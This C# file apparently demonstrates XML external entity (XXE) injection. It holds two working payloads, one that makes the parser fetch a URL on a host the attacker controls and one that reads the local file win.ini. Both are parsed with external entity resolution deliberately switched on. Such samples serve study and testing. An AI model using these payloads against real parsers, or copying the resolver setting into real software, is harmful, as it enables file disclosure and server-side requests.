using System;
using System.Xml;

namespace CSharp.XXE.Sample
{
    public class Program
    {
        public static void Main()
        {
            MakeHttpRequest();
            ReadLocalFile();
        }

        private static void MakeHttpRequest()
        {            
            string xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                               + "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://somewebsiteyoucontrol.local/juice\"> ]>"
                               + "<httprequest>&xxe;</httprequest>";

            Console.WriteLine(xml);

            var xmlDoc = new XmlDocument();
            xmlDoc.XmlResolver = new XmlUrlResolver();
            xmlDoc.LoadXml(xml);

            DisplayList(xmlDoc.ChildNodes);
        }


        private static void ReadLocalFile()
        {
            string xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                                + "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///windows/win.ini\"> ]>"
                                + "<lfi>&xxe;</lfi>";

            Console.WriteLine(xml);

            var xmlDoc = new XmlDocument();
            xmlDoc.XmlResolver = new XmlUrlResolver();
            xmlDoc.LoadXml(xml);

            DisplayList(xmlDoc.ChildNodes);
        }

        static void DisplayList(XmlNodeList nodeList)
        {
            foreach (XmlNode node in nodeList)
            {
                RecurseXmlDocumentNoSiblings(node);
            }
        }

        static void RecurseXmlDocumentNoSiblings(XmlNode root)
        {
            if (root is XmlElement)
            {
                Console.WriteLine(root.Name);
                if (root.HasChildNodes)
                    RecurseXmlDocument(root.FirstChild);
            }
            else if (root is XmlText)
            {
                string text = ((XmlText)root).Value;
                Console.WriteLine(text);
            }
            else if (root is XmlComment)
            {
                string text = root.Value;
                Console.WriteLine(text);
                if (root.HasChildNodes)
                    RecurseXmlDocument(root.FirstChild);
            }
        }
        static void RecurseXmlDocument(XmlNode root)
        {
            if (root is XmlElement)
            {
                Console.WriteLine(root.Name);
                if (root.HasChildNodes)
                    RecurseXmlDocument(root.FirstChild);
                if (root.NextSibling != null)
                    RecurseXmlDocument(root.NextSibling);
            }
            else if (root is XmlText)
            {
                string text = ((XmlText)root).Value;
                Console.WriteLine(text);
            }
            else if (root is XmlComment)
            {
                string text = root.Value;
                Console.WriteLine(text);
                if (root.HasChildNodes)
                    RecurseXmlDocument(root.FirstChild);
                if (root.NextSibling != null)
                    RecurseXmlDocument(root.NextSibling);
            }
            else if (root is XmlEntityReference)
            {
                string text = root.Value;
                Console.WriteLine(text);
                if (root.HasChildNodes)
                    RecurseXmlDocument(root.FirstChild);
                if (root.NextSibling != null)
                    RecurseXmlDocument(root.NextSibling);
            }
        }
    }
}




